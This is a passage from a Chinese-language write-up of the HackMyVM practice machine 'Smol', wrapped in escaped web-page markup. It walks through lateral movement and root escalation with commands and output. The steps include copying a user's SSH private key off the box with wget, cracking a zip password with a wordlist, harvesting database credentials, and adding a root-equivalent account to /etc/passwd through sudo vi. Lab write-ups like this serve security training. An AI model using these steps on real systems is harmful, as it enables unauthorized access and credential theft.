\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\nsandiegocalifornia (?)  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e本来想通过ssh来登录，但是提示须要\u003ccode\u003eSSH\u003c/code\u003e私钥\u003c/p\u003e\n\u003cp\u003e最后通过\u003ccode\u003esu\u003c/code\u003e的方法来切换用户，最后可以切换到\u003ccode\u003ediego\u003c/code\u003e用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewww-data@smol:/var/www/wordpress/wp-admin$ su diego\nsu diego\nPassword: sandiegocalifornia\n\ndiego@smol:/var/www/wordpress/wp-admin$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eUserFlag\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003euserflag\u003c/code\u003e就在\u003ccode\u003ediego\u003c/code\u003e用户的家目录下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ediego@smol:~$ cat user.txt\n45edaec653ff9ee06236b7ce72b86963\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e提权  - think用户\u003c/h3\u003e\n\u003cp\u003e然后在\u003ccode\u003ethink\u003c/code\u003e用户的家目录可以找到\u003ccode\u003essh\u003c/code\u003e的私钥文件，将其保存到\u003ccode\u003ekali\u003c/code\u003e 上，然后使用私钥文件登录\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e开启\u003ccode\u003epython\u003c/code\u003e的\u003ccode\u003ehttp\u003c/code\u003e服务器\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ediego@smol:/home/think/.ssh$ python3 -m http.server \u003cspan class=\"hljs-number\"\u003e8001\u003c/span\u003e\nServing HTTP on \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e port \u003cspan class=\"hljs-number\"\u003e8001\u003c/span\u003e (http://\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e8001\u003c/span\u003e/) ...\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e将其拉取到\u003ccode\u003ekali\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e┌──(root㉿kali)-[~/Desktop/test/SMOL]\n└─\u003cspan class=\"hljs-comment\"\u003e# wget 192.168.56.16:8001/id_rsa           \u003c/span\u003e\n--\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-05 05:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e--  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e8001\u003c/span\u003e/id_rsa\n正在连接 \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e8001.\u003c/span\u003e.. 已连接。\n已发出 HTTP 请求，正在等待回应... \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e OK\n长度：\u003cspan class=\"hljs-number\"\u003e2602\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e2.5\u003c/span\u003eK) [application/octet-stream]\n正在保存至: “id_rsa”\n\nid_rsa             \u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e%[==============\u003e]   \u003cspan class=\"hljs-number\"\u003e2.54\u003c/span\u003eK  --.-KB/s  用时 0s      \n\n\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-05 05:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e402\u003c/span\u003e MB/s) - 已保存 “id_rsa” [\u003cspan class=\"hljs-number\"\u003e2602\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2602\u003c/span\u003e])\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用私钥文件登录，成功登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e┌──(root㉿kali)-[~/Desktop/test/SMOL]\n└─\u003cspan class=\"hljs-comment\"\u003e# ssh think@192.168.56.16 -i id_rsa\u003c/span\u003e\nWelcome to Ubuntu \u003cspan class=\"hljs-number\"\u003e20.04\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e LTS (GNU/Linux \u003cspan class=\"hljs-number\"\u003e5.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e156\u003c/span\u003e-generic x86_64)\n\n * Documentation:  https://\u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e of Wed 05 Feb \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e 06:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e PM UTC\n\n  System load:  \u003cspan class=\"hljs-number\"\u003e0.06\u003c/span\u003e              Processes:                \u003cspan class=\"hljs-number\"\u003e218\u003c/span\u003e\n  Usage of /:   \u003cspan class=\"hljs-number\"\u003e55.8\u003c/span\u003e% of \u003cspan class=\"hljs-number\"\u003e9.75\u003c/span\u003eGB   Users logged \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e:          \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n  Memory usage: \u003cspan class=\"hljs-number\"\u003e35\u003c/span\u003e%               IPv4 address \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e enp0s17: \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e\n  Swap usage:   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e%\n\nExpanded Security Maintenance \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e Applications \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e enabled.\n\n\u003cspan class=\"hljs-number\"\u003e162\u003c/span\u003e updates can be applied immediately.\n\u003cspan class=\"hljs-number\"\u003e125\u003c/span\u003e of these updates are standard security updates.\nTo see these additional updates run: apt \u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e --upgradable\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e run: sudo pro status\n\nThe \u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e of available updates \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e more than a week old.\nTo check \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e new updates run: sudo apt update\n\nthink@smol:~$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e在\u003ccode\u003egege\u003c/code\u003e用户加目录下发现\u003ccode\u003ewordpress.old.zip\u003c/code\u003e文件，但是没有权限读取\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ethink@smol:/home/gege$ ls -al                                                                                                                                \ntotal \u003cspan class=\"hljs-number\"\u003e31532\u003c/span\u003e                                                                                                                                                  \ndrwxr-x--- \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e gege internal     \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Aug \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e .                                                                                                           \ndrwxr-xr-x \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e root root         \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Aug \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e ..                           \nlrwxrwxrwx \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root            \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e Aug \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e .bash_history -\u003e /dev/null   \n-rw-r--r-- \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e gege gege          \u003cspan class=\"hljs-number\"\u003e220\u003c/span\u003e Feb \u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e .bash_logout                 \n-rw-r--r-- \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e gege gege         \u003cspan class=\"hljs-number\"\u003e3771\u003c/span\u003e Feb \u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e .bashrc                      \n-rw-r--r-- \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e gege gege          \u003cspan class=\"hljs-number\"\u003e807\u003c/span\u003e Feb \u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e .profile                     \nlrwxrwxrwx \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root            \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e Aug \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e .viminfo -\u003e /dev/null                                                                                       \n-rwxr-x--- \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root gege     \u003cspan class=\"hljs-number\"\u003e32266546\u003c/span\u003e Aug \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e wordpress.old.\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e\n\nthink@smol:/home/gege$ cat wordpress.old.\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e                                                                                                                 \ncat: wordpress.old.\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e: Permission denied \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看一下\u003ccode\u003eid\u003c/code\u003e组，发现属于\u003ccode\u003edev\u003c/code\u003e组\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ethink@smol:/home/gege$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e                                                                                                                                    \nuid=\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e(think) gid=\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e(think) groups=\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e(think),\u003cspan class=\"hljs-number\"\u003e1004\u003c/span\u003e(dev),\u003cspan class=\"hljs-number\"\u003e1005\u003c/span\u003e(internal) \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看组内成员\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ethink@smol:/home/gege$ cat /etc/group | grep dev\nplugdev:x:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e:\ndev:x:\u003cspan class=\"hljs-number\"\u003e1004\u003c/span\u003e:think,gege\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e切换\u003ccode\u003egege\u003c/code\u003e用户，发现不用密码，然后再切换回去就要密码了，一开始我以为是因为gege用户没有密码，但是我尝试了\u003ccode\u003esudo -l\u003c/code\u003e后，输入空密码但是错误，所以可能是再\u003ccode\u003e/etc/sudoers\u003c/code\u003e文件里面设置了\u003ccode\u003ethink\u003c/code\u003e用户切换\u003ccode\u003egege\u003c/code\u003e用户无需密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ethink@smol:/home/gege$ su gege\ngege@smol:~$\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试解压\u003ccode\u003ewordpress.old.zip\u003c/code\u003e 发现需要密码，将其拉取下来准备破解\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egege@smol:~$ unzip wordpress.old.\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e \nArchive:  wordpress.old.\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e\n[wordpress.old.\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e] wordpress.old/wp-config.php password:\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003ewordpress.old.zip\u003c/h3\u003e\n\u003cp\u003e使用\u003ccode\u003efcrackzip\u003c/code\u003e来破解，爆破出密码\u003ccode\u003ehero_gege@hotmail.com\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e┌──(root㉿kali)-[~/Desktop/test/SMOL]\n└─\u003cspan class=\"hljs-comment\"\u003e# fcrackzip -D -p /usr/share/wordlists/rockyou.txt wordpress.old.zip   \u003c/span\u003e\npossible pw found: hero_gege@hotmail.com ()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看里面的文件，寻找有用的信息\u003c/p\u003e\n\u003cp\u003e在\u003ccode\u003ewp-config.php\u003c/code\u003e中可以找到\u003ccode\u003exavi\u003c/code\u003e用户的密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e/** Database username */                                                      \ndefine( \u003cspan class=\"hljs-string\"\u003e'DB_USER'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'xavi'\u003c/span\u003e );                                                  \n                                       \n/** Database password */\ndefine( \u003cspan class=\"hljs-string\"\u003e'DB_PASSWORD'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'P@ssw0rdxavi@'\u003c/span\u003e );\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们直接从\u003ccode\u003egege\u003c/code\u003e用户直接\u003ccode\u003esu\u003c/code\u003e到\u003ccode\u003exavi\u003c/code\u003e用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egege@smol:~$ su xavi\nPassword: \nxavi@smol:/home/gege$\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e提权\u003c/h3\u003e\n\u003cp\u003e因为有了密码，我们可以查看\u003ccode\u003esudo\u003c/code\u003e的信息了，发现可以使用\u003ccode\u003eroot\u003c/code\u003e的权限修改\u003ccode\u003e/etc/passwd\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003exavi@smol:~$ sudo -l\n[sudo] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e xavi: \nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e xavi on smol:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/usr/sbin\\:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/sbin\\:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/snap/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\n\nUser xavi may run the following commands on smol:\n    (ALL : ALL) /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/vi /etc/passwd\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e那么这就可以获取到\u003ccode\u003eroot\u003c/code\u003e权限了，我们直接新建一个用户，把它的权限设置为和\u003ccode\u003eroot\u003c/code\u003e相当即可\u003c/p\u003e\n\u003cp\u003e添加新用户\u003ccode\u003esunset\u003c/code\u003e密码是\u003ccode\u003ehack\u003c/code\u003e ，修改完毕后保存并退出\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003esunset:zSZ7Whrr8hgwY:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:root:/root:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/bash\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e切换用户，成功获取到\u003ccode\u003eroot\u003c/code\u003e权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003exavi@smol:~$ su sunset\nPassword: \nroot@smol:/home/xavi$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eRootFlag\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eroot@smol:/home/xavi$ cat /root/root.txt \nbf89ea3ea01992353aef1f576214d4e4\n\u003c/code\u003e\u003c/pre\u003e","title":"HackMyVM - Smol","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"Smol.\n\n https://hackmyvm.eu/machines/machine.php?vm=Smol\n \n\nNotes: I hope you will enjoy it.\n\n信息收集\n\n\n\n\n\n\n\n\n\n渗透\n\n优先级 `80`  `22`\n\nweb 渗透\n\n访问一下`web`页面（需要修改一下`hosts`文件，把域名指向靶机`IP`）\n\n通过`Wappalyzer`可以看到是用`W..."},"recentPosts":[{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"},{"id":"TheHackersLabsPa Que Aiga Lujo","title":"TheHackersLabs - Pa Que Aiga Lujo","date":"2025-09-28","isEncrypted":false,"year":"2025","month":"09","day":"28"},{"id":"HackMyVMSilentdev","title":"HackMyVM - Silentdev","date":"2025-09-26","isEncrypted":false,"year":"2025","month":"09","day":"26"},{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"04","day":"03","id":"HackMyVMSmol"},"buildId":"0QnArrLpf1pqsE_vMSfi-","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>